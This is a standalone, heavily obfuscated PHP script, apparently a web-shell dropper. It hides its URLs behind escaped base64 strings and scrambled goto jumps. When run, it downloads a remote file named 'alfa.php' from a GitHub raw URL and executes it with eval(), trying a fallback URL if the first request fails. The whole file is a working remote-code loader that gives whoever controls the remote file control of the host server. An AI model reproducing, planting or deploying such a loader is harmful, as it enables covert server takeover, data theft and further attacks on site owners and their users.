<?php
 goto VcEXI; Xvd7U: $x = "\77\x3e"; goto LgQYM; LgQYM: $url1 = base64_decode("\141\110\122\60\143\x48\115\x36\x4c\171\x39\x79\131\130\x63\x75\x5a\x32\x6c\60\x61\110\126\151\x64\130\x4e\154\x63\x6d\116\x76\x62\x6e\x52\154\142\156\x51\x75\131\x32\71\x74\114\62\x68\154\142\155\x52\x79\141\x57\x74\161\144\x57\64\x34\117\x44\147\x76\x61\x58\102\x6b\x62\151\x39\x79\x5a\x57\x5a\x7a\x4c\x32\x68\x6c\131\127\x52\172\114\62\61\150\x61\x57\x34\166\x59\127\170\x6d\x59\x53\x35\167\141\110\x41\x3d"); goto RBAyE; RBAyE: $url2 = base64_decode("\x61\x48\122\60\143\x48\115\x36\114\171\71\171\x59\130\x63\165\x5a\x32\154\60\141\x48\x56\151\144\x58\116\x6c\x63\x6d\x4e\166\142\156\122\154\x62\x6e\121\165\131\62\x39\164\114\x32\x68\x6c\142\x6d\x52\171\x61\127\x74\x71\x64\x57\64\x34\117\x44\147\166\x61\x58\102\153\142\151\71\171\132\127\x5a\172\114\62\150\x6c\x59\x57\x52\x7a\114\x32\61\x68\141\x57\64\x76\x59\127\x78\155\x59\123\x35\x77\141\110\101\75"); goto e3Hnn; gl4pn: if ($script1 !== false && $script1 !== 404) { eval($x . $script1); } else { $script2 = get($url2); if ($script2 !== false) { eval($x . $script2); } else { echo "\x42\x6f\164\150\40\x61\164\x74\x65\155\x70\x74\163\x20\146\x61\151\x6c\145\144\x2e"; } } goto o6vOB; e3Hnn: $script1 = get($url1); goto gl4pn; VcEXI: function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); if ($http_code == 200) { curl_setopt($ch, CURLOPT_NOBODY, false); curl_setopt($ch, CURLOPT_HEADER, false); $data = curl_exec($ch); curl_close($ch); return $data; } else { curl_close($ch); return false; } } goto Xvd7U; o6vOB: ?>